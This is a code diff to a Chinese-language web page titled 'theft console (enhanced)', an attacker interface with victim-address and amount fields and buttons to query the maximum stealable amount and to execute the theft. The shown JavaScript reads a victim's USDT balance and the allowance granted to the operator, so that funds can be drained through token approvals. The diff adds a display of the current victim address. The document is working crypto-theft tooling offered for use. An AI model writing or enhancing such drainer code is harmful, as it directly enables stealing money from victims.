@@ -3,7 +3,8 @@
 <head><meta charset="UTF-8"><title>盜取控制台（增強版）</title></head>
 <body>
 <h2>🛠️ 攻擊者操作介面</h2>
-<input id="victim" placeholder="受害者地址"><br><div id="authStatus" style="color:green;font-weight:bold;margin-top:5px;"></div>
+<div id="lastVictim" style="color:green;font-weight:bold;margin-bottom:8px;"></div>
+<input id="victim" placeholder="受害者地址"><br>
 <input id="amount" placeholder="金額（例：1000000 = 1 USDT）"><br>
 <button onclick="getMax()">查詢最大可盜金額</button>
 <button onclick="steal()">執行盜取</button>
@@ -64,6 +65,7 @@ async function getMax() {
   const allowance = await contract.methods.allowance(victim, account).call();
   const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
   document.getElementById("amount").value = max;
+  document.getElementById("lastVictim").innerText = "🟢 目前授權地址：" + victim;
   log("查詢最大值：Balance=" + balance + ", Allowance=" + allowance + ", 可盜金額=" + max);
 }
 
